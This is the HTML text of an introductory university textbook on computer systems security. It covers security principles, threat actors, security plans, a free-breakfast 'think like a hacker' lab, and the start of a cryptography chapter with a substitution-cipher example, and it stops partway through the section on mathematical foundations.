<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta name="generator" content="Asciidoctor 2.0.17">
<meta name="author" content="Ryan Tolboom">
<title>Computer Systems Security: Planning for Success</title>
<style>
/* Asciidoctor default stylesheet | MIT License | https://asciidoctor.org */

@import url(//fonts.googleapis.com/css?family=Ubuntu);
@import url(//asciidoctor.org/stylesheets/asciidoctor.css); /* Default asciidoc style framework - important */

/* CUSTOMISATIONS */
/* Change the values in root for quick customisation. If you want even more fine grain... venture further. */

:root{
--maincolor:#FFFFFF;
--primarycolor:#E95420;
--secondarycolor:#333333;
--tertiarycolor: #772953;
--sidebarbackground:#CCC;
--linkcolor:#b71c1c;
--linkcoloralternate:#f44336;
--white:#FFFFFF;
--black:#000000;
}

/* Text styles */
body{font-family: "Ubuntu",sans-serif;}

h1,h2{color:var(--primarycolor) !important;font-family:"Ubuntu",sans-serif;}
h3,h4,h5,h6{color:var(--secondarycolor);font-family: "Ubuntu",sans-serif;}
.title{color:(--primarycolor) !important;font-family:"Ubuntu",sans-serif;font-style: normal; font-weight: normal;}
p{font-family: "Ubuntu",sans-serif ! important}
#toc.toc2 a:link{color:white;}
/* code{background-color: var(--secondarycolor) !important;color:var(--white)}*/


/* Table styles */
th{background-color: var(--tertiarycolor);color:var(--white) !important;}

#toc.toc2{background-color:#2C001E;color:white;}
#toc.toc2.a{color:white;}
#toctitle{color:#E95420;}

/* Lab blocks */
body {
    counter-reset: labnum;
}

.lab > .title::before {
    counter-increment: labnum;
    content: "Lab " counter(labnum) ": ";
}

.lab > .content {
  background-color: #fffef7;
  border-color: #e0e0dc;
  -webkit-box-shadow: 0 1px 4px #e0e0dc;
  box-shadow: 0 1px 4px #e0e0dc;
  padding: 1.25em;
}

.lab > .title {
  color: #7a2518;
  margin-top: 0;
  text-align: center;
  font-size: 1.3em;
  font-family: "Ubuntu",sans-serif;
  font-style: normal;
}

.lab img {
  border: 1px solid #dedede;
}

.lab table {
  margin-left: 1em;
  margin-right: 1em;
}

/* Deliverable admonitions */
.admonitionblock.deliverable td.icon .icon-important:before {
  content:"\f15b";
  color:#000;
}

/* Responsiveness fixes */
video {
  max-width: 100%;
}

@media all and (max-width: 600px) {
table {
  width: 55vw!important;
  font-size: 3vw;
}

</style>
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
</head>
<body class="article toc2 toc-left">
<div id="header">
<h1>Computer Systems Security: Planning for Success</h1>
<div class="details">
<span id="author" class="author">Ryan Tolboom</span><br>
<span id="email" class="email"><a href="mailto:Ryan.Tolboom@njit.edu">Ryan.Tolboom@njit.edu</a></span><br>
</div>
<div id="toc" class="toc2">
<div id="toctitle">Table of Contents</div>
<ul class="sectlevel1">
<li><a href="#_legal">Legal</a></li>
<li><a href="#_acknowledgements">Acknowledgements</a></li>
<li><a href="#_introduction">1. Introduction</a>
<ul class="sectlevel2">
<li><a href="#_managing_risk">1.1. Managing Risk</a></li>
<li><a href="#_learning_the_lingo">1.2. Learning the Lingo</a></li>
<li><a href="#_hacker_culture">1.3. Hacker Culture</a></li>
<li><a href="#_threat_actors">1.4. Threat Actors</a></li>
<li><a href="#_security_plans">1.5. Security Plans</a></li>
<li><a href="#_tools_of_the_trade">1.6. Tools of the Trade</a></li>
<li><a href="#_review">1.7. Review</a></li>
</ul>
</li>
<li><a href="#_cryptography">2. Cryptography</a>
<ul class="sectlevel2">
<li><a href="#_why_do_we_need_cryptography">2.1. Why do we need cryptography?</a></li>
<li><a href="#_terminology">2.2. Terminology</a></li>
<li><a href="#_keys">2.3. Keys</a></li>
<li><a href="#_mathematical_foundation">2.4. Mathematical Foundation</a></li>
<li><a href="#_hashes">2.5. Hashes</a></li>
<li><a href="#_symmetric_encryption">2.6. Symmetric Encryption</a></li>
<li><a href="#_asymmetric_encryption">2.7. Asymmetric Encryption</a></li>
<li><a href="#_stream_ciphers">2.8. Stream Ciphers</a></li>
<li><a href="#_block_ciphers">2.9. Block Ciphers</a></li>
<li><a href="#_encryption_examples">2.10. Encryption Examples</a></li>
<li><a href="#_review_2">2.11. Review</a></li>
</ul>
</li>
<li><a href="#_malware_wip">3. Malware (WIP)</a>
<ul class="sectlevel2">
<li><a href="#_what_is_malware">3.1. What is malware?</a></li>
<li><a href="#_malware_targets">3.2. Malware Targets</a></li>
<li><a href="#_types_of_malware">3.3. Types of Malware</a></li>
<li><a href="#_indicators_of_compromise">3.4. Indicators of Compromise</a></li>
<li><a href="#_delivery_of_malware">3.5. Delivery of Malware</a></li>
<li><a href="#_review_3">3.6. Review</a></li>
</ul>
</li>
<li><a href="#_protocols">4. Protocols</a>
<ul class="sectlevel2">
<li><a href="#_network_access_layer">4.1. Network Access Layer</a></li>
<li><a href="#_internet_layer_protocols">4.2. Internet Layer Protocols</a></li>
<li><a href="#_transport_layer_protocols">4.3. Transport Layer Protocols</a></li>
<li><a href="#_application_layer_protocols">4.4. Application Layer Protocols</a></li>
<li><a href="#_review_4">4.5. Review</a></li>
</ul>
</li>
<li><a href="#_attacks_wip">5. Attacks (WIP)</a>
<ul class="sectlevel2">
<li><a href="#_interception_attacks">5.1. Interception Attacks</a></li>
<li><a href="#_layer_2_attacks">5.2. Layer 2 Attacks</a></li>
<li><a href="#_review_5">5.3. Review</a></li>
</ul>
</li>
<li><a href="#_solutions_wip">6. Solutions (WIP)</a></li>
<li><a href="#_permissions_wip">7. Permissions (WIP)</a>
<ul class="sectlevel2">
<li><a href="#_review_6">7.1. Review</a></li>
</ul>
</li>
<li><a href="#_vulnerability_management_and_compliance">8. Vulnerability Management and Compliance</a>
<ul class="sectlevel2">
<li><a href="#_review_7">8.1. Review</a></li>
</ul>
</li>
</ul>
</div>
</div>
<div id="content">
<div id="preamble">
<div class="sectionbody">
<div class="imageblock text-center">
<div class="content">
<img src="images/cover.svg" alt="cover" width="50%">
</div>
</div>
</div>
</div>
<div class="sect1">
<h2 id="_legal">Legal</h2>
<div class="sectionbody">
<div class="paragraph">
<p>This work is licensed under a <a href="http://creativecommons.org/licenses/by-sa/4.0/">Creative Commons Attribution-ShareAlike 4.0 International License.</a></p>
</div>
<div class="paragraph">
<p><span class="image"><img src="images/cc.png" alt="Creative Commons License"></span></p>
</div>
<div class="paragraph">
<p>All product names, logos, and brands are property of their respective owners.
All company, product and service names used in this text are for identification purposes only.
Use of these names, logos, and brands does not imply endorsement.</p>
</div>
</div>
</div>
<div class="sect1">
<h2 id="_acknowledgements">Acknowledgements</h2>
<div class="sectionbody">
<div class="paragraph">
<p>The author would like to thank New Jersey Institute of Technology (NJIT) Open Access Textbooks (OAT) project for helping to make this text possible.</p>
</div>
<div class="paragraph">
<p>The author would also like to acknowledge the contributions and hard work of:</p>
</div>
<div class="ulist">
<ul>
<li>
<p>Karl Giannoglou, Adjunct Professor NJIT</p>
</li>
<li>
<p>Jacob Jones, NJIT 2023</p>
</li>
</ul>
</div>
</div>
</div>
<div class="sect1">
<h2 id="_introduction">1. Introduction</h2>
<div class="sectionbody">
<div class="sect2">
<h3 id="_managing_risk">1.1. Managing Risk</h3>
<div class="imageblock left">
<div class="content">
<img src="images/db-locked.svg" alt="db locked" width="200">
</div>
</div>
<div class="paragraph">
<p><em>Information security</em> (infosec) is largely the practice of preventing <em>unauthorized access</em> to data.
Unauthorized access is when an actor gains access to data that they do not have the permissions to access.
The system is often used in an unintended manner to provide such access.
Data has become an increasingly valuable asset and the <em>risks</em> of others having access to data are incredibly high.
Because of this, information security typically falls under the risk-management plan of a company and its importance cannot be understated.
This is evidenced by the fact that information technology&#8217;s (IT) typical role in a company has migrated from a basic service provider to directorships with a seat at the highest decision making table.
This is directly due to the fact that IT assets have become the most valuable things many companies own.
Guarding these assets and managing the inherent risk of their loss is the job of information security professionals.</p>
</div>
<div class="paragraph">
<p><em>Malicious software</em>, also referred to as malware, is often employed to help an attacker gain access to a system.
Many types of malicious software exist, but the common thread is that they perform actions that cause harm to a computer system or network.
In the case of many attacks, <em>system failure</em> may occur either as an intended (as is the case in Denial of Service (DoS) attacks) or unintended consequence.
This means the system will no longer be able to perform its intended purpose.
System failure is a serious risk that needs to be managed.</p>
</div>
</div>
<div class="sect2">
<h3 id="_learning_the_lingo">1.2. Learning the Lingo</h3>
<div class="paragraph">
<p>In general, the technical fields are laden with acronyms and obtuse vocabulary.
Unfortunately security is no exception to this rule.
Three of the most important acronyms you should be aware of to start are <em>CIA</em>, <em>AAA</em>, and <em>DRY</em>.</p>
</div>
<div class="sect3">
<h4 id="_cia">1.2.1. CIA</h4>
<div class="imageblock right">
<div class="content">
<img src="images/cia.svg" alt="cia" width="300" height="128">
</div>
</div>
<div class="paragraph">
<p>While the Central Intelligence Agency does have a role to play in information security, for our purposes CIA is an acronym used to remember the three foundational information security principles: confidentiality, integrity, and availability.
These ideas form the cornerstone of security and should be ever-present in your thoughts.</p>
</div>
<div class="paragraph">
<p><em>Confidentiality</em> refers to the practice of keeping secret information secret.
For example, if an e-commerce site stores credit card numbers (a questionable practice to begin with) those credit card numbers should be kept <em>confidential</em>.
You would not want other users of the site or outsiders to have access to your credit card number.
Many steps could be taken to ensure the confidentiality of user credit card numbers, but at this point it is enough to understand that maintaining confidentiality is a principle of security.</p>
</div>
<div class="paragraph">
<p><em>Integrity</em> is an assurance that data has not been corrupted or purposefully tampered with.
As we discussed previously, data is very valuable, but how valuable is it if you can&#8217;t be sure it is intact and reliable?
In security we strive to maintain integrity so that the system and even the controls we have in place to guard the system can be trusted.
Imagine that e-commerce site again.
What would happen if an attacker could arbitrarily change delivery addresses stored in the system?
Packages could be routed to improper addresses and stolen and honest customers would not receive what they ordered, all because of an integrity violation.</p>
</div>
<div class="paragraph">
<p><em>Availability</em> means that a system should remain up and running to ensure that valid users have access to the data when needed.
In the simplest sense, you could ensure confidentiality and integrity by simply taking the system off line and not allowing any access.
Such a system would be useless and this final principle addresses that.
Systems are designed to be accessible and part of your security plan should be ensuring that they are.
You will need to account for the costs of implementing confidentiality and integrity and make sure that the resources are available to keep the system working.
In an extreme case, denial of service (DoS) attacks can actually target availability.
By keeping this principle in mind, hopefully you can mitigate some of those risks.</p>
</div>
</div>
<div class="sect3">
<h4 id="_aaa">1.2.2. AAA</h4>
<div class="imageblock left">
<div class="content">
<img src="images/aaa.svg" alt="aaa" width="200" height="128">
</div>
</div>
<div class="paragraph">
<p>Another acronym you&#8217;re going to encounter in many different contexts is AAA.
It stands for <em>Authentication</em>, <em>Authorization</em>, and <em>Accounting</em> and it is used in designing and implementing protocols.
These concepts should be remembered when designing security plans.</p>
</div>
<div class="paragraph">
<p>Authentication is the process of confirming someone&#8217;s identity.
This may be done with user names and passwords or more frequently via multi-factor authentication (MFA) which requires not only something you know, but something you have (fingerprints, key fob, etc.).</p>
</div>
<div class="paragraph">
<p>Authorization refers to keeping track of which resources an entity has access to.
This can be done via a permission scheme or access control list (ACL).
Occasionally you will encounter something more exotic where authorization limits users to interactions during a particular time of day or from a particular IP address.</p>
</div>
<div class="paragraph">
<p>Accounting refers to tracking the usage of resources.
This may be as simple as noting in a log file when a user has logged in to keeping track of exactly which services and user uses and how long they use them.
Accounting is incredibly important because it allows you to not only monitor for possible problems, but also inspect what has occurred <em>after</em> a problem is encountered.
Accounting also allows system administrators to show irrefutably what actions a user has taken.
This can be very important evidence in a court of law.</p>
</div>
</div>
<div class="sect3">
<h4 id="_dry">1.2.3. DRY</h4>
<div class="paragraph">
<p>While we&#8217;re dispensing knowledge in the form of three letter acronyms (TLAs), another important acronym to keep in mind is DRY: Don&#8217;t Repeat Yourself.</p>
</div>
<div class="quoteblock">
<blockquote>
Say something once, why say it again?
</blockquote>
<div class="attribution">
&#8212; Talking Heads<br>
<cite>Psycho Killer</cite>
</div>
</div>
<div class="paragraph">
<p>This is of course not entirely literal.
Just because you&#8217;ve explained something to a coworker once does <em>not</em> mean that you shouldn&#8217;t explain it again.
It is meant as more of a guide for how you make use of <em>automation</em> and how you design systems.
Increasingly security experts are not being asked to analyze a single system, but a network of hundreds if not thousands of systems.
In this case you should make use of scripts and tools to make sure you are not manually doing the same thing over and over.
Have you found a good way of testing to see if a part of a system is secure?
Put it in a script so that you can reuse the test on other systems.
This same logic applies to how systems are designed.
Do you have a database of user login info?
Reuse that database across multiple systems.
In short, "Don&#8217;t repeat yourself!"</p>
</div>
</div>
</div>
<div class="sect2">
<h3 id="_hacker_culture">1.3. Hacker Culture</h3>
<div class="paragraph">
<p>The term <em>hacker</em> comes from the sound that programmers would make when typing or <em>hacking</em> away at keyboards.
Originally a hacker was anyone who worked feverishly at a problem on a computer and the term <em>cracker</em> was used to define people who attempted to bypass security systems.
The distinction was eventually lost and a hacker has come to be the popular term for someone attempting to gain unauthorized access to data.
For an interesting glimpse into early hacker culture/reasoning read <a href="https://archive.org/stream/The_Conscience_of_a_Hacker/hackersmanifesto.txt">The Conscience of a Hacker</a> by The Mentor originally published in Phrack Magazine 1986.</p>
</div>
<div class="sidebarblock">
<div class="content">
<div class="title">Hacker Hats</div>
<div class="imageblock right">
<div class="content">
<img src="images/hats.png" alt="hats" width="450">
</div>
</div>
<div class="paragraph">
<p>An early attempt at classifying hackers involved assigning hat colors according to their motivations.
This harkens back to the old western movies where the bad guys wore black hats and the good guys wore white hats.
Just as in real life nothing is clearly black and white, as such we&#8217;ve laid the traditional roles on a two-axis continuum from malicious to benevolent and illegal to legal.</p>
</div>
<div class="dlist">
<dl>
<dt class="hdlist1">White Hat</dt>
<dd>
<p>These hackers are typically employed by a company to test the security of their systems.
They operate legally with the intent of ultimately improving security.</p>
</dd>
<dt class="hdlist1">Black Hat</dt>
<dd>
<p>These hackers operate outside the bounds of the law, and as such are subject to prosecution.
Their intent is nefarious usually involving personal profit, malice, or some combination of the two.</p>
</dd>
<dt class="hdlist1">Gray Hat</dt>
<dd>
<p>A gray hat hacker operates illegally but ultimately wants to improve the security of the system.
They may inform administrators of the details of their breach or they may be acting to force a group to better secure their system.
In rare circumstances a gray hat hacker may actually exploit a system for the purposes of hardening it once they have gained administrative access.
It should be noted that despite the good intentions, gray hat hackers are still operating illegally and may be subject to prosecution.</p>
</dd>
</dl>
</div>
<div class="paragraph">
<p>There are several more hat distinctions (blue hats, green hats, etc.) with mixed meanings.
For example a blue hat may refer to an external entity hired by a company to test the security of a component, as is the case in Microsoft, or it may refer to a hacker motivated by revenge.
It is also worth nothing that the second quadrant of our graph is empty, but this does not mean that there aren&#8217;t malicious, legal hackers.
These may be software developers exploiting legal loopholes or possibly even individuals working for another government engaged in cyber warfare.</p>
</div>
</div>
</div>
</div>
<div class="sect2">
<h3 id="_threat_actors">1.4. Threat Actors</h3>
<div class="imageblock right">
<div class="content">
<a class="image" href="https://en.wikipedia.org/wiki/Guy_Fawkes_mask#Anonymous"><img src="images/anonymous.svg" alt="anonymous" width="200"></a>
</div>
<div class="title">Figure 1. Guy Fawkes Mask</div>
</div>
<div class="paragraph">
<p>To better be able to manage the risks of a data breach, it helps to be able to identify/understand the attacker or threat actor involved.
Just as there are many reasons an actor may attempt to gain unauthorized access there are also many groups of threat actors.</p>
</div>
<div class="paragraph">
<p>Neophytes making use of automated tools that they may not fully understand are often referred to a <em>script kiddies</em>.
You may hear other pejorative names as well such as lamer, noob, or luser, but the common thread is that these threat actors are <em>not</em> highly sophisticated.
The same techniques used for automating defensive security can also be applied to automating attacks.
Unfortunately this means that you may encounter actors "punching above their weight" or using complex tools while having only a rudimentary understanding of what they do.</p>
</div>
<div class="paragraph">
<p>Hacktivist are threat actors that attack to further social or political ends.
These groups can be very sophisticated.
The most well known hacktivist group is <em>Anonymous</em> which has been linked to several politically motivated attacks.</p>
</div>
<div class="paragraph">
<p>Organized crime is another element which may employ or support threat actors typically to make money.
These groups typically have access to more resources and contacts than a solo actor.
It is important to note that threat actors with roots in organized crime may find it easier to migrate into other areas of crime due to their proximity to a large criminal enterprise.
For example, while it may be difficult for a script kiddie to broker the sale of valuable data, a hacker working with an organized crime syndicate may have people close to them that are familiar with the sale of stolen goods.</p>
</div>
<div class="paragraph">
<p>The last group of threat actors, and arguably the group with the most resources, are threat actors working with or for governments and nation states.
These groups may have the explicit or implicit permission of their country to commit cyber crimes targeting other nations.
Given the constant threat and resources available to these groups, they are referred to as an advanced persistent threat (APT).
By utilizing the resources of a nation (often including its intelligence and military resources) APTs are a severe threat.</p>
</div>
</div>
<div class="sect2">
<h3 id="_security_plans">1.5. Security Plans</h3>
<div class="paragraph">
<p>While confronting such a diverse array of actors can seem daunting at first, the key element to being successful is having a plan.
A <em>security plan</em> analyzes the risks, details the resources that need to be protected, and presents a clear path to protecting them.
Typically a security plan utilizes the three types of security controls available: physical, administrative, and technical.</p>
</div>
<div class="ulist">
<ul>
<li>
<p>Physical controls are things like door locks, cameras, or even the way rooms in a building are laid out.
These things can have a dramatic impact on the overall security and should not be overlooked!</p>
</li>
<li>
<p>Administrative controls include human resources policies (HR), classifying and limiting access to data, and separating duties.
It helps to have a whole-organization understanding of security to make it easier to put these controls in place.</p>
</li>
<li>
<p>Technical controls are often what new security professionals think of first.
These are things like intrusion detection systems (IDS), firewalls, anti-malware software, etc.
While these are an important segment of security and they are the segment that falls almost entirely within the purview of IT, it is critical to remember that these are only as strong as the physical and administrative controls that support them!</p>
</li>
</ul>
</div>
<div class="admonitionblock warning">
<table>
<tr>
<td class="icon">
<i class="fa icon-warning" title="Warning"></i>
</td>
<td class="content">
Physical controls definitely lack the cool factor that technical controls have.
Movies typically show security professionals hunched over laptops typing frantically or scrolling rapidly through pages and pages of logs on a giant screen.
Rarely do they show them filling out a purchase order (PO) to have a locksmith come in and re-key the locks to the data closet.
Just because it isn&#8217;t cool doesn&#8217;t mean it isn&#8217;t important!
Remember, once an attacker has physical access, anything is possible.
</td>
</tr>
</table>
</div>
</div>
<div class="sect2">
<h3 id="_tools_of_the_trade">1.6. Tools of the Trade</h3>
<div class="paragraph">
<p>With all of this talk regarding how and why hackers attack systems, the question remains, "What can be done?"
There are a few tools the security professional employs that are worth mentioning at this juncture including: <em>user awareness</em>, <em>anti-malware software</em>, <em>backups</em>, and <em>encryption</em>.</p>
</div>
<div class="dlist">
<dl>
<dt class="hdlist1">User Awareness</dt>
<dd>
<p>A major risk, some would argue the biggest risk, is that unprepared users will run malware programs or perform other harmful actions as directed by actors looking to gain access.
These actors may impersonate others or perform other <em>social engineering</em> tactics to cause users to do as they say.
Probably the scariest statistic is the ease with which a massive attack requiring little effort can be performed.
Threat actors do not even need to personally reach out to users, they could simply send a mass email.
Through training programs and other methods of interaction a security professional can make users aware of these threats and train them to act accordingly.
Raising user awareness is a critical component of any security plan.</p>
</dd>
<dt class="hdlist1">Anti-Malware Software</dt>
<dd>
<p>Given how prevalent the use of malware is a host of tools have been developed to prevent its usage.
These tools may filter download requests to prevent downloading malware, monitor network traffic to detect active malware patterns, scan files for malware signatures, or harden operating system loopholes used by malware.
A security plan will typically detail the type of anti-malware software being used as well as the intended purpose of its usage.</p>
</dd>
<dt class="hdlist1">Backups</dt>
<dd>
<p>Maintaining a copy of the data used by a system can be a quick solution to the problems of ransomware and other attacks aimed at causing or threatening system failure.
While a backup does not solve the problem of the data being sold or used by others, it does allow for a quick recovery in many instances and should be part of a security plan.</p>
</dd>
<dt class="hdlist1">Encryption</dt>
<dd>
<p>At its most simple, encryption obfuscates data and requires a key to make it useful.
Encryption can be employed to make copies of data obtained through unauthorized access useless to attackers that do not have the key.
Often, encryption and backups complement each other and fill in the use cases that each lacks individually.
As such, encryption will show up multiple times and in multiple ways in an average security plan.</p>
</dd>
</dl>
</div>
</div>
<div class="sect2">
<h3 id="_review">1.7. Review</h3>
<div class="sect3">
<h4 id="_labs">1.7.1. Labs</h4>
<div class="openblock lab">
<div class="title">Think Like a Hacker</div>
<div class="content">
<div class="paragraph">
<p>For this lab, we will be engaging in a though experiment.
Imagine you are at a university that is having a student appreciation breakfast.
At the entrance to the cafeteria an attendant has a clipboard with all of the student IDs listed.
Students line up, show their ID, and their ID number is crossed off of the list.</p>
</div>
<div class="paragraph">
<p>Thinking like a hacker, how would you exploit this system to get extra free breakfasts?
Feel free to think outside the box and make multiple plans depending on the circumstances you would encounter when go the breakfast.
Come up with at least five different ways of getting free breakfasts and then see if you can map them to real-world information security attacks.</p>
</div>
<div class="paragraph">
<p>Here is an example that you <em>can not</em> use:</p>
</div>
<div class="paragraph">
<p>I would tell the attendant that I forgot my ID, but I know my number and then give someone elses number.
This is very similar to logging in to systems by claiming the user has forgotten their password and then knowing the answers to the security questions required to change the password.</p>
</div>
</div>
</div>
</div>
<div class="sect3">
<h4 id="_questions">1.7.2. Questions</h4>
<div class="qlist qanda">
<ol>
<li>
<p><em>In terms of information security, what does CIA stand for? What do each of the principles mean?</em></p>
<p></p>
</li>
<li>
<p><em>Why is it important to have a security plan? What types of controls can a security plan make use of? Give an example of each.</em></p>
<p></p>
</li>
<li>
<p><em>How do backups and encryped data compliment eachother? Explain.</em></p>
<p></p>
</li>
</ol>
</div>
</div>
</div>
</div>
</div>
<div class="sect1">
<h2 id="_cryptography">2. Cryptography</h2>
<div class="sectionbody">
<div class="paragraph">
<p>This chapter is meant to serve as a brief and gentle introduction to the cryptographic concepts often encountered in the field of security.
It is by no means exhaustive but it should provide a basis for a better understanding of why protocols are designed the way they are.
Cryptography is a method of scrambling data into non-readable text.
It allows us to transform data into a secure form so that unauthorized users cannot view it.</p>
</div>
<div class="sect2">
<h3 id="_why_do_we_need_cryptography">2.1. Why do we need cryptography?</h3>
<div class="paragraph">
<p>Cryptography is used to set up secure channels of communication, but it can also be used to provide non-repudiation of actions, basically leaving digital footprints that show someone did something.
This means that cryptography allows us to provide authentication, authorization, <em>and</em> accounting (AAA).</p>
</div>
<div class="paragraph">
<p>By using a secure and <em>confidential</em> encrypted channel we can be sure that anyone who intercepts our communications cannot "listen in." This helps prevents <em>man-in-the-middle (MITM)</em> attacks.
Cryptography can also be used to provide <em>integrity</em>: proving that the data is valid. With cryptography you can provide a <em>signature</em> for the data showing that the person who claims to have sent it really did send it.
Cryptography also allows for <em>non-repudiation</em> as it can show that only one person was capable of sending a particular message. Lastly cryptography also allows us to perform authentication <em>without</em> storing passwords in plaintext.
This is critical in an age where data breaches are increasingly common.</p>
</div>
<div class="sidebarblock">
<div class="content">
<div class="title">Case Study: Equifax</div>
<div class="paragraph">
<p><a href="https://www.ftc.gov/enforcement/cases-proceedings/refunds/equifax-data-breach-settlement">In September of 2017, Equifax announced a data breach the exposed the personal information of 147 million people.</a>
The original attack made use of an exploit in an outdated version of <a href="https://struts.apache.org/">Apache Struts</a> which was being used as part of Equifax&#8217;s system for handling credit disputes from customers.
Once the attackers had gained access to internal Equifax servers, the began gathering as much information as they could from internal databases.</p>
</div>
<div class="paragraph">
<p>What is particularly egregious about this data breach is that passwords in many databases were stored in plaintext.
This means that the attackers were able to try the passwords and usernames on other services.
While it is important that users use different passwords for different services it is far more disturbing that a company as large as Equifax did not have the policies in place to use cryptography to mitigate the risks from such an enormous breach.</p>
</div>
</div>
</div>
</div>
<div class="sect2">
<h3 id="_terminology">2.2. Terminology</h3>
<div class="paragraph">
<p>Going forward, it is important to address some common cryptography terms as they will be used frequently:</p>
</div>
<div class="dlist">
<dl>
<dt class="hdlist1">Plaintext</dt>
<dd>
<p><a href="https://en.wikipedia.org/wiki/Plaintext">unencrypted information</a>, data that is "in clear", or cleartext</p>
</dd>
<dt class="hdlist1">Cipher</dt>
<dd>
<p><a href="https://en.wikipedia.org/wiki/Cipher">an algorithm for performing encryption or decryption</a></p>
</dd>
<dt class="hdlist1">Ciphertext</dt>
<dd>
<p>data that has undergone encryption</p>
</dd>
<dt class="hdlist1">Cryptographic algorithm</dt>
<dd>
<p>a series of steps to follow to encrypt or decrypt data</p>
</dd>
<dt class="hdlist1">Public key</dt>
<dd>
<p>information (typically a byte array) that can be used to encrypt data such that only the owner of the matching <em>private key</em> can unencrypt it</p>
</dd>
<dt class="hdlist1">Private (secret) key</dt>
<dd>
<p>information (typically a byte array) that can be used to decrypt data encrypted using the corresponding public key</p>
</dd>
</dl>
</div>
<div class="exampleblock">
<div class="title">Example 1. Caesar Cipher</div>
<div class="content">
<div class="paragraph">
<p>One of the most basic examples of encryption is the Caesar cipher, or substitution cipher.
It is easy to understand, compute, and trivial to crack.
Let&#8217;s create a table that maps every letter in the alphabet to a different letter:</p>
</div>
<table class="tableblock frame-all grid-all stretch">
<colgroup>
<col style="width: 3.8461%;">
<col style="width: 3.8461%;">
<col style="width: 3.8461%;">
<col style="width: 3.8461%;">
<col style="width: 3.8461%;">
<col style="width: 3.8461%;">
<col style="width: 3.8461%;">
<col style="width: 3.8461%;">
<col style="width: 3.8461%;">
<col style="width: 3.8461%;">
<col style="width: 3.8461%;">
<col style="width: 3.8461%;">
<col style="width: 3.8461%;">
<col style="width: 3.8461%;">
<col style="width: 3.8461%;">
<col style="width: 3.8461%;">
<col style="width: 3.8461%;">
<col style="width: 3.8461%;">
<col style="width: 3.8461%;">
<col style="width: 3.8461%;">
<col style="width: 3.8461%;">
<col style="width: 3.8461%;">
<col style="width: 3.8461%;">
<col style="width: 3.8461%;">
<col style="width: 3.8461%;">
<col style="width: 3.8475%;">
</colgroup>
<thead>
<tr>
<th class="tableblock halign-left valign-top">A</th>
<th class="tableblock halign-left valign-top">B</th>
<th class="tableblock halign-left valign-top">C</th>
<th class="tableblock halign-left valign-top">D</th>
<th class="tableblock halign-left valign-top">E</th>
<th class="tableblock halign-left valign-top">F</th>
<th class="tableblock halign-left valign-top">G</th>
<th class="tableblock halign-left valign-top">H</th>
<th class="tableblock halign-left valign-top">I</th>
<th class="tableblock halign-left valign-top">J</th>
<th class="tableblock halign-left valign-top">K</th>
<th class="tableblock halign-left valign-top">L</th>
<th class="tableblock halign-left valign-top">M</th>
<th class="tableblock halign-left valign-top">N</th>
<th class="tableblock halign-left valign-top">O</th>
<th class="tableblock halign-left valign-top">P</th>
<th class="tableblock halign-left valign-top">Q</th>
<th class="tableblock halign-left valign-top">R</th>
<th class="tableblock halign-left valign-top">S</th>
<th class="tableblock halign-left valign-top">T</th>
<th class="tableblock halign-left valign-top">U</th>
<th class="tableblock halign-left valign-top">V</th>
<th class="tableblock halign-left valign-top">W</th>
<th class="tableblock halign-left valign-top">X</th>
<th class="tableblock halign-left valign-top">Y</th>
<th class="tableblock halign-left valign-top">Z</th>
</tr>
</thead>
<tbody>
<tr>
<td class="tableblock halign-left valign-top"><p class="tableblock">J</p></td>
<td class="tableblock halign-left valign-top"><p class="tableblock">G</p></td>
<td class="tableblock halign-left valign-top"><p class="tableblock">T</p></td>
<td class="tableblock halign-left valign-top"><p class="tableblock">Q</p></td>
<td class="tableblock halign-left valign-top"><p class="tableblock">X</p></td>
<td class="tableblock halign-left valign-top"><p class="tableblock">Y</p></td>
<td class="tableblock halign-left valign-top"><p class="tableblock">A</p></td>
<td class="tableblock halign-left valign-top"><p class="tableblock">U</p></td>
<td class="tableblock halign-left valign-top"><p class="tableblock">C</p></td>
<td class="tableblock halign-left valign-top"><p class="tableblock">R</p></td>
<td class="tableblock halign-left valign-top"><p class="tableblock">V</p></td>
<td class="tableblock halign-left valign-top"><p class="tableblock">I</p></td>
<td class="tableblock halign-left valign-top"><p class="tableblock">F</p></td>
<td class="tableblock halign-left valign-top"><p class="tableblock">H</p></td>
<td class="tableblock halign-left valign-top"><p class="tableblock">O</p></td>
<td class="tableblock halign-left valign-top"><p class="tableblock">K</p></td>
<td class="tableblock halign-left valign-top"><p class="tableblock">L</p></td>
<td class="tableblock halign-left valign-top"><p class="tableblock">E</p></td>
<td class="tableblock halign-left valign-top"><p class="tableblock">D</p></td>
<td class="tableblock halign-left valign-top"><p class="tableblock">B</p></td>
<td class="tableblock halign-left valign-top"><p class="tableblock">W</p></td>
<td class="tableblock halign-left valign-top"><p class="tableblock">S</p></td>
<td class="tableblock halign-left valign-top"><p class="tableblock">Z</p></td>
<td class="tableblock halign-left valign-top"><p class="tableblock">M</p></td>
<td class="tableblock halign-left valign-top"><p class="tableblock">N</p></td>
<td class="tableblock halign-left valign-top"><p class="tableblock">P</p></td>
</tr>
</tbody>
</table>
<div class="paragraph">
<p>Now creating a message is simple a matter of performing the substitutions.
For example, <code>HELLO WORLD</code> becomes <code>UXIIO ZOEIQ</code>.</p>
</div>
<div class="paragraph">
<p>While this is simple to understand and set up, it is also very easy to break.
You could use a frequency attack, where you analyze a large chunk of encrypted text knowing that certain letters are more frequent than others.
By matching up the most frequently used ciphertext letters with their standard English equivalents you may quickly reach a solution.
You could also go through all permutations of the alphabet (4E26) and see what gives you the most English words.
The second attack is made much more feasible through computing.</p>
</div>
</div>
</div>
</div>
<div class="sect2">
<h3 id="_keys">2.3. Keys</h3>
<div class="paragraph">
<p>Typically a series of random bytes can be used as a key to either encrypt or decrypt data.
A key is used by a cryptographic algorithm to change plaintext to ciphertext.
Keys may also be asymmetric in that they can only be used to perform <em>one</em> of the operations (either encryption or decryption).</p>
</div>
<div class="paragraph">
<p>It is important to have an idea of what factors make a <em>strong</em> cryptographic key.
Length plays an important role.
The longer the key, the hard it is to <em>crack</em> the encryption.
Likewise the randomness of the data in the key also makes it stronger.
If the byte sequence is somehow predictable, the length is irrelevant.
Finally we have the concept of a cryptoperiod or lifetime of a key.
If we are working with a system that frequently changes keys an attacker may not have enough time to crack it.</p>
</div>
</div>
<div class="sect2">
<h3 id="_mathematical_foundation">2.4. Mathematical Foundation</h3>
<div class="paragraph">
<p>Cryptography relies largely on the concept of one-way or trap door functions.
That is a process that is hard to compute in one direction, but easy to compute in the other.
